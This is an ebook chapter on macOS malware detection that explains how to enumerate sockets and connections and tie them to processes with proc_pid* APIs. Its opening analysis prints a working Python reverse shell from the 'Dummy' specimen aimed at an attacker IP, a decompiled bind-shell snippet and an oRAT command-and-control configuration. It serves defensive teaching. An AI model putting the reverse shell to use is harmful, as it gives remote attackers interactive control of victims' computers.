<html><head></head><body>
<div id="book-content">
<div id="sbo-rt-content"><section epub:type="chapter" role="doc-chapter" aria-labelledby="ch4">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_101" aria-label="101"/>&#13;
<hgroup>&#13;
&#13;
<h2 class="CHAPTER" id="ch4">&#13;
<span class="CN"><span class="SANS_Futura_Std_Bold_Condensed_B_11">4</span></span>&#13;
<span class="CT"><span class="Sans_Dogma_B">NETWORK STATE AND STATISTICS</span></span>&#13;
</h2>&#13;
</hgroup>&#13;
<figure class="opener"><img class="opener" src="../images/opener.jpg" alt="" width="377" height="376"/></figure>&#13;
<p class="CO">Most Mac malware specimens make extensive use of the network for tasks such as exfiltrating data, downloading additional payloads, or communicating with command-and-control servers. If you can observe these unauthorized network events, you can turn them into a powerful detection heuristic. In this chapter, I’ll show you exactly how to create a snapshot of network activity, such as established connections and listening sockets, and tie each event to the process responsible for it. This information should play a vital role in any malware detection system, as it can detect even previously unknown malware.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_102" aria-label="102"/>I’ll concentrate on two approaches to enumerating network information: the <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pid*</span> APIs and the APIs found in the private <i>NetworkStatistics</i> framework. You can find complete code for both approaches in the Chapter 4 folder in this book’s GitHub repository.</p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
&#13;
<h3 class="H1"><span id="sec1"/><span id="h1-34"/><span class="SANS_Futura_Std_Bold_B_11">Host-Based vs. Network-Centric Collection</span></h3>&#13;
<p class="TNI">Generally, network information is captured either on the host or externally, at the network level (for example, via network security appliances). Though there are pros and cons to both approaches, this chapter focuses on the former. For malware detection, I prefer the host-based approach, as it can reliably identify the specific process responsible for observed network events.</p>&#13;
<p class="TX">It’s hard to overstate the value of being able to tie a network event to a process. This link allows you to closely inspect the process accessing the network and apply other heuristics to it to determine whether it might be malicious. For example, a persistently installed, non-notarized binary accessing the network may indeed be malware. Identifying the responsible process can also help uncover malware trying to masquerade its traffic as legitimate; a standard HTTP/S request originating from a signed and notarized browser is probably benign, while the same request associated with an unrecognized process is definitely worth examining more closely.</p>&#13;
<p class="TX">Another advantage of collecting networking information at the host level is that network traffic is usually encrypted, and a host-based approach can often avoid the complexities of network-level encryption, which gets applied later. You’ll see this benefit in <span class="Xref"><a href="chapter7.xhtml">Chapter 7</a></span>, which covers host-based approaches for continuously monitoring networking traffic.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
&#13;
<h3 class="H1"><span id="sec2"/><span id="h1-35"/><span class="SANS_Futura_Std_Bold_B_11">Malicious Networking Activity</span></h3>&#13;
<p class="TNI">Of course, the fact that a program accesses the network doesn’t mean it is malware. Most legitimate software on your computer likely uses the network. Still, certain types of network activity are more common in malware than in legitimate software. Here are a few examples of network activity that you should examine more closely:</p>&#13;
<blockquote>&#13;
<p class="EX1"><b>Listening sockets open to any remote connection</b> Malware may expose remote access by connecting a local shell to a socket that listens for connections from an external interface.</p>&#13;
<p class="EX"><b>Beacon requests that occur at regular intervals</b> Implants and other persistent malware may regularly check in with their command-and-control servers.</p>&#13;
<p class="EX2"><b>Large amounts of uploaded data</b> Malware often exfiltrates data from an infected system.</p>&#13;
</blockquote>&#13;
<p class="TX">Let’s consider some examples of malware and their network interactions. We’ll start with a specimen known as Dummy (named so by yours truly, as it’s <span role="doc-pagebreak" epub:type="pagebreak" id="pg_103" aria-label="103"/>rather simple minded). The malware creates an interactive shell that gives a remote attacker the ability to execute arbitrary commands on the infected host. Specifically, it persistently executes the following bash script containing Python code (which I’ve formatted to improve readability):</p>&#13;
&#13;
<pre><code>#!/bin/bash&#13;
while :&#13;
do&#13;
    python -c&#13;
        'import socket,subprocess,os;&#13;
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);&#13;
        s.connect(("185.243.115.230",1337));&#13;
        os.dup2(s.fileno(),0);&#13;
        os.dup2(s.fileno(),1);&#13;
        os.dup2(s.fileno(),2);&#13;
        p=subprocess.call(["/bin/sh","-i"]);'&#13;
    sleep 5&#13;
done&#13;
</code></pre>&#13;
<p class="TX">This code connects to the attacker’s server, found at 185.243.115.230 on port 1337. It then duplicates the standard in (stdin), out (stdout), and error (stderr) streams (whose file descriptors are 0, 1, and 2, respectively) to the connected socket. Lastly, it executes <i>/bin/sh</i> with the <span class="SANS_TheSansMonoCd_W5Regular_11">-i</span> flag to complete the setup of an interactive reverse shell. If you enumerated network connections on the infected host (for example, using the macOS <span class="SANS_TheSansMonoCd_W5Regular_11">lsof</span> utility, which lists open file descriptors from all processes), you would see a connection belonging to this Python-based shell:</p>&#13;
&#13;
<pre><code>% <b>lsof -nP | grep 1337 | grep -i python</b>&#13;
Python   ...   TCP   192.168.1.245:63353-&gt;185.243.115.230:1337 (ESTABLISHED)&#13;
</code></pre>&#13;
<p class="TX">Our second example is tied to a suspected Chinese hacker group best known for its Alchimist [<i>sic</i>] attack framework.<sup><a role="doc-noteref" id="chapter4_1" href="#chapter4-1">1</a></sup> When executed, the malicious code drops a dynamic library named <i>payload.so</i>. If we open this library (originally written in Go) in a decompiler, we can see that it contains logic to bind a shell to a listening socket:</p>&#13;
&#13;
<pre><code>os.Getenv(..., NOTTY_PORT, 0xa,...);&#13;
strconv.ParseInt(...);&#13;
fmt.Sprintf(..., 0.0.0.0,..., port,...);&#13;
net.Listen("tcp", address);&#13;
main.handle_connection(...);&#13;
</code></pre>&#13;
<p class="TX">It first reads a custom environment variable (<span class="SANS_TheSansMonoCd_W5Regular_11">NOTTY_PORT</span>) to build a network address string of the format <i>0.0.0.0:port</i>. If no port is specified, it defaults to 4444. Next, it invokes the <span class="SANS_TheSansMonoCd_W5Regular_11">Listen</span> method from the Go <i>net</i> library to create a listening TCP socket. A method named <span class="SANS_TheSansMonoCd_W5Regular_11">handle_connection</span> <span role="doc-pagebreak" epub:type="pagebreak" id="pg_104" aria-label="104"/>handles any connection to this socket. Using my network enumeration tool Netiquette (<a href="chapter4.xhtml#fig4-1">Figure 4-1</a>), you can see the malware’s listening socket.<sup><a role="doc-noteref" id="chapter4_2" href="#chapter4-2">2</a></sup></p>&#13;
<figure class="IMG"><img class="img1" id="fig4-1" src="../images/Figure4-1.jpg" alt="" width="1390" height="711"/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 4-1: Netiquette showing the listening socket on port 4444</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">The astute reader may have noticed that the socket listening on port 4444 is tied to a process named <i>loader</i> and not directly to the malicious <i>payload.so</i> library. This is because macOS tracks network events at the process level, not at the library level. Unfortunately, the researchers who uncovered the threat didn’t obtain the program that hosts the library, so I wrote the <i>loader</i> program to load and execute the malicious library for dynamic analysis.</p>&#13;
<p class="TX">Any code that uses system APIs to enumerate network connections can identify only the process from which the network activity originated. This activity could originate directly from code in the process’s main binary or, as is the case here, from one of the libraries loaded in its address space, providing yet another reason why it’s worth enumerating and analyzing a process’s loaded libraries, as we did in <span class="Xref"><a href="chapter1.xhtml">Chapter 1</a></span>.</p>&#13;
<p class="TX">Let’s consider one last sample. Rather than invoke a shell, the advanced persistent threat (APT) implant oRAT takes the more common approach of establishing a connection to an attacker’s command-and- control server. Using this connection, it can receive tasking to execute a wide range of actions that afford the remote attack complete control over the infected host.<sup><a role="doc-noteref" id="chapter4_3" href="#chapter4-3">3</a></sup> Rather unusually, it performs all tasking, as well as regular “heartbeat” check-ins, over a single multiplexed persistent connection. We can find the configuration for this connection, such as the protocol and address of the server, embedded directly in the oRAT binary. The information is encrypted, but as the decryption key is embedded in the binary as well, we can easily decrypt or dump it from memory at runtime, as discussed in Chapter 9 of <i>The Art of Mac Malware</i>, Volume 1. Here is a snippet of the decrypted configuration containing information about the command-and-control server:</p>&#13;
&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_105" aria-label="105"/>{&#13;
    ...&#13;
    "C2": {&#13;
        "Network": "stcp",&#13;
        "Address": "darwin.github.wiki:53"&#13;
    },&#13;
    ...&#13;
}&#13;
</code></pre>&#13;
<p class="TX">In the configuration, the value for the <span class="SANS_TheSansMonoCd_W5Regular_11">Network</span> key controls whether oRAT will communicate over TCP or UDP and whether it will encrypt its network traffic. A value of <span class="SANS_TheSansMonoCd_W5Regular_11">stcp</span> indicates TCP encrypted via Go’s Transport Layer Security (TLS) package.<sup><a role="doc-noteref" id="chapter4_4" href="#chapter4-4">4</a></sup> The configuration also reveals that the traffic is destined for the command-and-control server at <i>darwin.github.wiki</i> and will take place over port 53. Though traffic over this port is traditionally dedicated to DNS, there is nothing stopping malware authors from also making use of it, perhaps to blend in with legitimate DNS traffic or to slip through firewalls that normally allow outgoing traffic on this port.</p>&#13;
<p class="TX">Once the malware is running, we can readily observe the connection to the attacker’s server, either programmatically or manually, via system or third-party networking tools. I’ll now focus on the former, showing you how to programmatically enumerate sockets and network connections, provide metadata for each, and identify the process responsible for the network activity.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
&#13;
<h3 class="H1"><span id="sec3"/><span id="h1-36"/><span class="SANS_Futura_Std_Bold_B_11">Capturing the Network State</span></h3>&#13;
<p class="TNI">There are several ways to capture network activity, such as with listening sockets and established connections. One method is to use various <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pid*</span> APIs. This workflow is inspired by Palomino Labs’s <i>get_process_handles</i> project.<sup><a role="doc-noteref" id="chapter4_5" href="#chapter4-5">5</a></sup></p>&#13;
<p class="TX">First, we’ll invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pidinfo</span> function with a process ID and the <span class="SANS_TheSansMonoCd_W5Regular_11">PROC_PIDLISTFDS</span> constant to get a list of all file descriptors currently opened by the specified process. We’re interested in this list of file descriptors because it will also include sockets. To extract just the sockets, we’ll iterate over all the file descriptors, focusing on those whose type is set to <span class="SANS_TheSansMonoCd_W5Regular_11">PROX_FDTYPE_SOCKET</span>.</p>&#13;
<p class="TX">Certain socket types have names prefixed with <span class="SANS_TheSansMonoCd_W5Regular_11">AF</span>, which stands for <i>address family</i>. Some of these sockets (for example, those whose type is <span class="SANS_TheSansMonoCd_W5Regular_11">AF_UNIX</span>) are local, and programs can use them as an interprocess communication (IPC) mechanism. These aren’t generally related to malicious activity, so we can ignore them, especially in this context of enumerating network activity. However, for sockets of type <span class="SANS_TheSansMonoCd_W5Regular_11">AF_INET</span> (used for IPv4 connections) or <span class="SANS_TheSansMonoCd_W5Regular_11">AF_INET6</span> (used for IPv6 connections), we can extract information such as their protocol (UDP or TCP), local port, and address. For TCP sockets, we’ll also extract their remote port, address, and state (whether it’s listening, established, and so on).</p>&#13;
<p class="TX">Let’s walk through code that implements this functionality, which you can find in this chapter’s <i>enumerateNetworkConnections</i> project.</p>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_106" aria-label="106"/>&#13;
<h4 class="H2"><span id="sec4"/><span id="h2-33"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Retrieving Process File Descriptors</span></h4>&#13;
<p class="TNI">We begin with a call to the <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pidinfo</span> API, passing it a process ID, the <span class="SANS_TheSansMonoCd_W5Regular_11">PROC _PIDLISTFDS</span> flag, and three arguments set to zero to obtain the size needed for the full list of the process’s open file descriptors (<a href="chapter4.xhtml#Lis4-1">Listing 4-1</a>). It’s common, especially for older C-based APIs such as <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pid*</span>, to call the function first with a <span class="SANS_TheSansMonoCd_W5Regular_11">NULL</span> buffer and zero-byte length to obtain the true length required to store the data. A subsequent call to the same API with a new size and newly allocated buffer will then return the requested data.</p>&#13;
<span id="Lis4-1"/>&#13;
<pre><code>#import &lt;libproc.h&gt;&#13;
#import &lt;sys/proc_info.h&gt;&#13;
&#13;
pid_t pid = &lt;some process id&gt;;&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> int size = proc_pidinfo(pid, PROC_PIDLISTFDS, 0, NULL, 0);&#13;
struct proc_fdinfo* fdInfo = (struct proc_fdinfo*)malloc(size);&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> proc_pidinfo(pid, PROC_PIDLISTFDS, 0, fdInfo, size);&#13;
...&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-1: Obtaining a process’s file descriptors</span></p>&#13;
<p class="TX">Once we’ve obtained this necessary size and allocated an appropriate buffer <span class="CodeAnnotation" aria-label="annotation1">❶</span>, we reinvoke <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pidinfo</span>, this time with the buffer and its size, to retrieve the process’s file descriptors <span class="CodeAnnotation" aria-label="annotation2">❷</span>. When the function returns, the provided buffer will contain a list of <span class="SANS_TheSansMonoCd_W5Regular_11">proc_fdinfo</span> structures: one for each of the process’s open file descriptors. The header file <i>sys/proc_info.h</i> defines these structures as follows:</p>&#13;
&#13;
<pre><code>struct proc_fdinfo {&#13;
    int32_t   proc_fd;&#13;
    uint32_t  proc_fdtype;&#13;
};&#13;
</code></pre>&#13;
<p class="TX">They contain just two members: a file descriptor (<span class="SANS_TheSansMonoCd_W5Regular_11">proc_fd</span>) and the file descriptor type (<span class="SANS_TheSansMonoCd_W5Regular_11">proc_fdtype</span>).</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
&#13;
<h4 class="H2"><span id="sec5"/><span id="h2-34"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Extracting Network Sockets</span></h4>&#13;
<p class="TNI">With a list of a process’s file descriptors, you can now iterate over each to find any sockets (<a href="chapter4.xhtml#Lis4-2">Listing 4-2</a>).</p>&#13;
<span id="Lis4-2"/>&#13;
<pre><code>for(int i = 0; i &lt; (size/PROC_PIDLISTFD_SIZE); i++) {&#13;
    if(PROX_FDTYPE_SOCKET != fdInfo[i].proc_fdtype) {&#13;
        continue;&#13;
    }&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-2: Iterating over a list of file descriptors ignoring non-sockets</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_107" aria-label="107"/>As the buffer has been populated with a list of <span class="SANS_TheSansMonoCd_W5Regular_11">proc_fdinfo</span> structures, the code scopes the iteration by taking the buffer’s size and dividing it by the <span class="SANS_TheSansMonoCd_W5Regular_11">PROC_PIDLISTFD_SIZE</span> constant to obtain the number of items in the array. This constant conveniently holds the <span class="SANS_TheSansMonoCd_W5Regular_11">proc_fdinfo</span> structure size. Next, the code examines each file descriptor’s type by checking the <span class="SANS_TheSansMonoCd_W5Regular_11">proc_fdtype</span> member of each <span class="SANS_TheSansMonoCd_W5Regular_11">proc_fdinfo</span> structure. Sockets have a type of <span class="SANS_TheSansMonoCd_W5Regular_11">PROX_FDTYPE _SOCKET</span>; the code ignores file descriptors of any other type by executing the <span class="SANS_TheSansMonoCd_W5Regular_11">continue</span> statement, which causes the current iteration of the <span class="SANS_TheSansMonoCd_W5Regular_11">for</span> loop to terminate prematurely and the next to commence, meaning it will begin processing the next file descriptor.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
&#13;
<h4 class="H2"><span id="sec6"/><span id="h2-35"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Obtaining Socket Details</span></h4>&#13;
<p class="TNI">Now, to get detailed information about the sockets, we invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pidfdinfo</span> function. It takes five parameters: the process ID, the file descriptor, a value indicating the type of information we’re requesting from the file descriptor, an out pointer to a structure, and the structure’s size (<a href="chapter4.xhtml#Lis4-3">Listing 4-3</a>).</p>&#13;
<span id="Lis4-3"/>&#13;
<pre><code>struct socket_fdinfo socketInfo = {0};&#13;
&#13;
proc_pidfdinfo(pid, fdInfo[i].proc_fd,&#13;
PROC_PIDFDSOCKETINFO, &amp;socketInfo, PROC_PIDFDSOCKETINFO_SIZE);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-3: Obtaining information about a socket file descriptor</span></p>&#13;
<p class="TX">Because we’ll place this code in the <span class="SANS_TheSansMonoCd_W5Regular_11">for</span> loop iterating over the list of a process’s sockets (<a href="chapter4.xhtml#Lis4-2">Listing 4-2</a>), we can reference each socket by indexing into this list: <span class="SANS_TheSansMonoCd_W5Regular_11">fdInfo[i].proc_fd</span>. The <span class="SANS_TheSansMonoCd_W5Regular_11">PROC_PIDFDSOCKETINFO</span> constant instructs the API to return socket information, while the <span class="SANS_TheSansMonoCd_W5Regular_11">PROC_PIDFDSOCKETINFO_SIZE</span> constant contains the size of a <span class="SANS_TheSansMonoCd_W5Regular_11">socket_fdinfo</span> structure. You can find both in Apple’s <i>sys/proc_info.h</i> file.</p>&#13;
<p class="TX">I mentioned that not all sockets are related to network activity. As such, the code focuses only on the networking sockets whose family is either <span class="SANS_TheSansMonoCd_W5Regular_11">AF_INET</span> or <span class="SANS_TheSansMonoCd_W5Regular_11">AF_INET6</span>. These sockets are often referred to as Internet Protocol (IP) sockets. We can find a socket’s family in the <span class="SANS_TheSansMonoCd_W5Regular_11">socket_fdinfo</span> structure by examining the <span class="SANS_TheSansMonoCd_W5Regular_11">soi_family</span> member of its <span class="SANS_TheSansMonoCd_W5Regular_11">psi</span> member (<a href="chapter4.xhtml#Lis4-4">Listing 4-4</a>).</p>&#13;
<span id="Lis4-4"/>&#13;
<pre><code>if((AF_INET != socketInfo.psi.soi_family) &amp;&amp; (AF_INET6 != socketInfo.psi.soi_family))  {&#13;
    continue;&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-4: Examining a socket’s family</span></p>&#13;
<p class="TX">Because we execute this code within the <span class="SANS_TheSansMonoCd_W5Regular_11">for</span> loop, we skip any non-IP socket by executing the <span class="SANS_TheSansMonoCd_W5Regular_11">continue</span> statement, which advances to the next.</p>&#13;
<p class="TX">The remainder of the code extracts various information from the <span class="SANS_TheSansMonoCd_W5Regular_11">socket _fdinfo</span> structure and saves it into a dictionary. You’ve already seen this family, which should be either <span class="SANS_TheSansMonoCd_W5Regular_11">AF_INET</span> or <span class="SANS_TheSansMonoCd_W5Regular_11">AF_INET6</span> (<a href="chapter4.xhtml#Lis4-5">Listing 4-5</a>).</p>&#13;
<span id="Lis4-5"/>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_108" aria-label="108"/>NSMutableDictionary* details = [NSMutableDictionary dictionary];&#13;
details[@"family"] = (AF_INET == socketInfo.psi.soi_family) ? @"IPv4" : @"IPv6";&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-5: Extracting a socket’s family type</span></p>&#13;
<p class="TX">We can find the socket’s protocol in the <span class="SANS_TheSansMonoCd_W5Regular_11">soi_kind</span> member of the <span class="SANS_TheSansMonoCd_W5Regular_11">psi</span> structure. (Recall that <span class="SANS_TheSansMonoCd_W5Regular_11">psi</span> is a <span class="SANS_TheSansMonoCd_W5Regular_11">socket_info</span> structure.) It’s important to take into account the differences between protocols when extracting information from the socket, because you’ll have to reference different structures. For UDP sockets, which have <span class="SANS_TheSansMonoCd_W5Regular_11">soi_kind</span> set to <span class="SANS_TheSansMonoCd_W5Regular_11">SOCKINFO_IN</span>, we use the <span class="SANS_TheSansMonoCd_W5Regular_11">pri_in</span> member of the <span class="SANS_TheSansMonoCd_W5Regular_11">soi_proto</span> structure, whose type is <span class="SANS_TheSansMonoCd_W5Regular_11">in_sockinfo</span>. On the other hand, for TCP sockets (<span class="SANS_TheSansMonoCd_W5Regular_11">SOCKINFO_TCP</span>), we use <span class="SANS_TheSansMonoCd_W5Regular_11">pri_tcp</span>, a <span class="SANS_TheSansMonoCd_W5Regular_11">tcp_sockinfo</span> structure (<a href="chapter4.xhtml#Lis4-6">Listing 4-6</a>).</p>&#13;
<span id="Lis4-6"/>&#13;
<pre><code>if(SOCKINFO_IN == socketInfo.psi.soi_kind) {&#13;
    struct in_sockinfo sockInfo_IN = socketInfo.psi.soi_proto.pri_in;&#13;
    // Add code to extract information from the UDP socket.&#13;
} else if(SOCKINFO_TCP == socketInfo.psi.soi_kind) {&#13;
    struct tcp_sockinfo sockInfo_TCP = socketInfo.psi.soi_proto.pri_tcp;&#13;
    // Add code to extract information from the TCP socket.&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-6: Extracting UDP or TCP socket structures</span></p>&#13;
<p class="TX">Once we’ve identified the appropriate structure, extracting information such as the local and remote endpoints for the socket is largely the same for either socket type. Even so, UDP sockets generally aren’t bound, so information about the remote endpoint won’t always be available. Moreover, these sockets are stateless, whereas TCP sockets will have a state.</p>&#13;
<p class="TX">Let’s now look at the code to extract information of interest from a TCP socket, starting with both the local and remote ports (<a href="chapter4.xhtml#Lis4-7">Listing 4-7</a>).</p>&#13;
<span id="Lis4-7"/>&#13;
<pre><code>} else if(SOCKINFO_TCP == socketInfo.psi.soi_kind) {&#13;
    struct tcp_sockinfo sockInfo_TCP = socketInfo.psi.soi_proto.pri_tcp;&#13;
    details[@"protocol"] = @"TCP";&#13;
&#13;
    details[@"localPort"] =&#13;
    [NSNumber numberWithUnsignedShort:ntohs(sockInfo_TCP.tcpsi_ini.insi_lport)]; <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
&#13;
    details[@"remotePort"] =&#13;
    [NSNumber numberWithUnsignedShort:ntohs(sockInfo_TCP.tcpsi_ini.insi_fport)]; <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
    ...&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-7: Extracting the local and remote ports from a TCP socket</span></p>&#13;
<p class="TX">We can find the local and remote ports in the <span class="SANS_TheSansMonoCd_W5Regular_11">insi_lport</span> <span class="CodeAnnotation" aria-label="annotation1">❶</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">insi_fport</span> <span class="CodeAnnotation" aria-label="annotation2">❷</span> members of the <span class="SANS_TheSansMonoCd_W5Regular_11">tcpsi_ini</span> structure, itself an <span class="SANS_TheSansMonoCd_W5Regular_11">in_sockinfo</span> structure. As these ports are stored in network-byte ordering, we convert them to host-byte ordering with the <span class="SANS_TheSansMonoCd_W5Regular_11">ntohs</span> API.</p>&#13;
<p class="TX">Next, we retrieve the local and remote addresses from the same <span class="SANS_TheSansMonoCd_W5Regular_11">tcpsi_ini</span> structure. Which structure members we access depends on whether <span role="doc-pagebreak" epub:type="pagebreak" id="pg_109" aria-label="109"/>the addresses are IPv4 or IPv6. In <a href="chapter4.xhtml#Lis4-8">Listing 4-8</a>, we extract IPv4 (<span class="SANS_TheSansMonoCd_W5Regular_11">AF_INET</span>) addresses.</p>&#13;
<span id="Lis4-8"/>&#13;
<pre><code>#import &lt;arpa/inet.h&gt;&#13;
&#13;
if(AF_INET == socketInfo.psi.soi_family) {&#13;
    char source[INET_ADDRSTRLEN] = {0};&#13;
    char destination[INET_ADDRSTRLEN] = {0};&#13;
&#13;
    inet_ntop(AF_INET,&#13;
    &amp;(sockInfo_TCP.tcpsi_ini.insi_laddr.ina_46.i46a_addr4), source, sizeof(source)); <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
&#13;
    inet_ntop(AF_INET, &amp;(sockInfo_TCP.tcpsi_ini.insi_faddr.ina_46.i46a_addr4),&#13;
    destination, sizeof(destination)); <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-8: Extracting local and remote IPv4 addresses</span></p>&#13;
<p class="TX">As shown in the code, we invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">inet_ntop</span> function to convert the IP addresses to human-readable strings. The local address is in the <span class="SANS_TheSansMonoCd_W5Regular_11">insi_laddr</span> member <span class="CodeAnnotation" aria-label="annotation1">❶</span>, while the remote address is in <span class="SANS_TheSansMonoCd_W5Regular_11">insi_faddr</span> <span class="CodeAnnotation" aria-label="annotation2">❷</span>. The addresses specify their maximum length using the <span class="SANS_TheSansMonoCd_W5Regular_11">INET_ADDRSTRLEN</span> constant, which also accounts for a <span class="SANS_TheSansMonoCd_W5Regular_11">NULL</span> terminator.</p>&#13;
<p class="TX">For IPv6 (<span class="SANS_TheSansMonoCd_W5Regular_11">AF_INET6</span>) sockets, we use the <span class="SANS_TheSansMonoCd_W5Regular_11">inet_ntop</span> function once again but pass it an <span class="SANS_TheSansMonoCd_W5Regular_11">in6_addr</span> structure (named <span class="SANS_TheSansMonoCd_W5Regular_11">ina_6</span> in the <span class="SANS_TheSansMonoCd_W5Regular_11">in_sockinfo</span> structure). Also note that the output buffers should be of size <span class="SANS_TheSansMonoCd_W5Regular_11">INET6_ADDRSTRLEN</span> (<a href="chapter4.xhtml#Lis4-9">Listing 4-9</a>).</p>&#13;
<span id="Lis4-9"/>&#13;
<pre><code>if(AF_INET6 == socketInfo.psi.soi_family) {&#13;
    char source[INET6_ADDRSTRLEN] = {0};&#13;
    char destination[INET6_ADDRSTRLEN] = {0};&#13;
&#13;
    inet_ntop(AF_INET6,&#13;
    &amp;(sockInfo_IN.insi_laddr.ina_6), source, sizeof(source));&#13;
&#13;
    inet_ntop(AF_INET6,&#13;
    &amp;(sockInfo_IN.insi_faddr.ina_6), destination, sizeof(destination));&#13;
&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-9: Extracting local and remote IPv6 addresses</span></p>&#13;
<p class="TX">Finally, we can find the state of the TCP connection (whether it’s closed, listening, established, and so on) in the <span class="SANS_TheSansMonoCd_W5Regular_11">tcpsi_state</span> member of the <span class="SANS_TheSansMonoCd_W5Regular_11">tcp_sockinfo</span> structure. The <i>sys/proc_info.h</i> header file defines the possible states as follows:</p>&#13;
&#13;
<pre><code>#define TSI_S_CLOSED            0       /* closed */&#13;
#define TSI_S_LISTEN            1       /* listening for connection */&#13;
#define TSI_S_SYN_SENT          2       /* active, have sent syn */&#13;
#define TSI_S_SYN_RECEIVED      3       /* have sent and received syn */&#13;
#define TSI_S_ESTABLISHED       4       /* established */&#13;
...&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_110" aria-label="110"/>In <a href="chapter4.xhtml#Lis4-10">Listing 4-10</a>, we convert a subset of these numeric values to human-readable strings with a simple <span class="SANS_TheSansMonoCd_W5Regular_11">switch</span> statement.</p>&#13;
<span id="Lis4-10"/>&#13;
<pre><code>switch(sockInfo_TCP.tcpsi_state) {&#13;
    case TSI_S_CLOSED:&#13;
        details[@"state"] = @"CLOSED";&#13;
        break;&#13;
&#13;
    case TSI_S_LISTEN:&#13;
        details[@"state"] = @"LISTEN";&#13;
        break;&#13;
&#13;
    case TSI_S_ESTABLISHED:&#13;
        details[@"state"] = @"ESTABLISHED";&#13;
        break;&#13;
    ...&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-10: Converting TCP states <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">(tcpsi_state)</span> to human-readable strings</span></p>&#13;
<p class="TX">Now, what if you wanted to resolve the destination IP address to a domain? One option is to use the <span class="SANS_TheSansMonoCd_W5Regular_11">getaddrinfo</span> API, which can accomplish this synchronously. This function will reach out to DNS servers to map the IP address to a domain, so you may want to perform this operation in a separate thread or use its asynchronous version, <span class="SANS_TheSansMonoCd_W5Regular_11">getaddrinfo_a</span>. <a href="chapter4.xhtml#Lis4-11">Listing 4-11</a> shows a simple helper function that accepts an IP address as a <span class="SANS_TheSansMonoCd_W5Regular_11">char*</span> string and then attempts to resolve it to a domain and return it as a string object.</p>&#13;
<span id="Lis4-11"/>&#13;
<pre><code>#import &lt;netdb.h&gt;&#13;
#import &lt;sys/socket.h&gt;&#13;
&#13;
NSString* hostForAddress(char* address) {&#13;
    struct addrinfo* results = NULL;&#13;
    char hostname[NI_MAXHOST] = {0};&#13;
    NSString* resolvedName = nil;&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation1">❶</span> if(0 == getaddrinfo(address, NULL, NULL, &amp;results)) {&#13;
      <span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> for(struct addrinfo* r = results; r != NULL; r = r-&gt;ai_next) {&#13;
            if(0 == getnameinfo(r-&gt;ai_addr, r-&gt;ai_addrlen,&#13;
              <span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> hostname, sizeof(hostname), NULL, 0, 0)) {&#13;
                resolvedName = [NSString stringWithUTF8String:hostname];&#13;
                break;&#13;
            }&#13;
        }&#13;
    }&#13;
    if(NULL != results) {&#13;
        freeaddrinfo(results);&#13;
    }&#13;
&#13;
    return resolvedName;&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-11: Resolving an address to a domain</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_111" aria-label="111"/>IP addresses can resolve to multiple hostnames or none at all. The latter case is common in malware that includes a hardcoded IP address for its remote server, which may not have a domain name entry.</p>&#13;
